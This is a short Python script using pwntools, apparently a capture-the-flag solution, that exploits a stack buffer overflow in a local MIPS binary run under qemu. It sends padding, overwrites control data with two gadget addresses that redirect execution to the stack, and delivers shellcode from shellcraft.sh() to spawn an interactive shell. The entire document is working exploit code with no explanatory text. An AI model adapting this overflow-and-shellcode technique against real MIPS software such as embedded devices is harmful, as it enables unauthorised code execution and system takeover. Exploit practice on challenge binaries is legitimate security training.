from pwn import *
context(arch="mips",endian="big",log_level="debug")

io = process(['qemu-mips','./pwn'])
#io = process(['qemu-mips','-g','1234','./pwn'])

io.sendlineafter("number: ",b'1')

sp_addr = 0x004273C4	#addiu $a2,$sp,0x64	jalr $s0
jalr_a2_addr = 0x00421684  # move $t9,$a2    jr    $a2  

payload = b'1:' 
payload += b'a'*0x6c + p32(jalr_a2_addr) + b'a'*0x20 + p32(sp_addr)
payload += b'a'*0x64 + asm(shellcraft.sh())
io.sendlineafter("eg => '1:Job.' ",payload)
io.interactive()
